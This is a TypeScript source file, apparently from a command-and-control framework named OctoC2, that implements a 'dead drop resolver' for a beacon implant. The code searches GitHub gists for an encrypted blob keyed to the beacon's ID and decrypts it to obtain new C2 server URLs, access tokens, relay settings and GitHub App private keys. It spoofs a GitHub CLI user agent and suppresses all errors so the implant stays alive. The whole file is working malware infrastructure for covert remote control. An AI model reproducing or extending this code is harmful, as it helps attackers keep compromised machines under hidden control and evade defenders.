/**
 * OctoC2 — DeadDropResolver
 *
 * Last-resort C2 recovery. Searches GitHub gists for a file named
 * data-{sha256hex(beaconId)[:16]}.bin, whose content is a libsodium
 * crypto_box_seal ciphertext (base64url) encrypted to this beacon's
 * X25519 public key.
 *
 * Resolution is fully best-effort: any error returns null.
 */

import { createHash }                    from "node:crypto";
import { openSealBox, derivePublicKey }  from "../crypto/sodium.ts";
import { GH_UA }                         from "../lib/constants.ts";
import type { TentacleKind, RelayConfig, ProxyConfig } from "../types.ts";

const RESOLVE_TIMEOUT_MS = 10_000;

export interface DeadDropPayload {
  version:           1;
  serverUrl?:        string;
  token?:            string;
  tentaclePriority?: TentacleKind[];
  consortium?:       RelayConfig[];
  proxyRepos?:       ProxyConfig[];
  /** GitHub App private key PEM — allows key rotation without redeployment */
  appPrivateKey?:    string;
  /** GitHub App ID — needed when migrating a beacon from PAT to App auth */
  appId?:            number;
  /** Installation ID for the C2 repo — paired with appId */
  installationId?:   number;
}

export class DeadDropResolver {
  /** Overridable for tests — production code leaves this at the default. */
  private apiBase = "https://api.github.com";

  /**
   * @param token  GitHub API token for authenticated requests
   * @param owner  Repo owner — accepted for API consistency; gist search is global
   * @param repo   Repo name — accepted for API consistency; gist search is global
   */
  constructor(
    private readonly token: string,
    private readonly owner: string,
    private readonly repo:  string,
  ) {}

  async resolve(beaconId: string, secretKey: Uint8Array): Promise<DeadDropPayload | null> {
    try {
      const tag = createHash("sha256").update(beaconId).digest("hex").slice(0, 16);
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), RESOLVE_TIMEOUT_MS);

      try {
        // 1. Search GitHub code for the gist filename
        const searchResp = await fetch(
          `${this.apiBase}/search/code?q=data-${tag}.bin+in:path&per_page=1`,
          {
            headers: {
              Authorization: `Bearer ${this.token}`,
              Accept: "application/vnd.github+json",
              "User-Agent": GH_UA,
            },
            signal: controller.signal,
          }
        );
        if (!searchResp.ok) return null;

        const searchData = await searchResp.json() as {
          total_count: number;
          items: Array<{ html_url?: string }>;
        };
        if (searchData.total_count === 0 || searchData.items.length === 0) return null;

        // 2. Parse gist ID from html_url like https://gist.github.com/user/abc123
        const htmlUrl = searchData.items[0]?.html_url ?? "";
        const gistMatch = htmlUrl.match(/gist\.github\.com\/[^/]+\/([a-f0-9]+)/);
        if (!gistMatch) return null;
        const gistId = gistMatch[1];

        // 3. Fetch gist content
        const gistResp = await fetch(`${this.apiBase}/gists/${gistId}`, {
          headers: {
            Authorization: `Bearer ${this.token}`,
            Accept: "application/vnd.github+json",
            "User-Agent": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
          },
          signal: controller.signal,
        });
        if (!gistResp.ok) return null;

        const gistData = await gistResp.json() as {
          files?: Record<string, { content?: string } | null>;
        };
        const filename = `data-${tag}.bin`;
        const fileObj = gistData.files?.[filename];
        if (!fileObj?.content) return null;
        const ciphertextB64 = fileObj.content.trim();

        // 4. Derive public key from secret key using scalarmult_base
        const pubkey = await derivePublicKey(secretKey);

        // 5. Open the sealed box
        const plainBytes = await openSealBox(ciphertextB64, pubkey, secretKey);
        const plain = new TextDecoder().decode(plainBytes);
        const payload = JSON.parse(plain) as DeadDropPayload;

        if (payload.version !== 1) return null;
        return payload;
      } finally {
        clearTimeout(timer);
      }
    } catch {
      // Best-effort: never crash the beacon on recovery attempt
      return null;
    }
  }
}
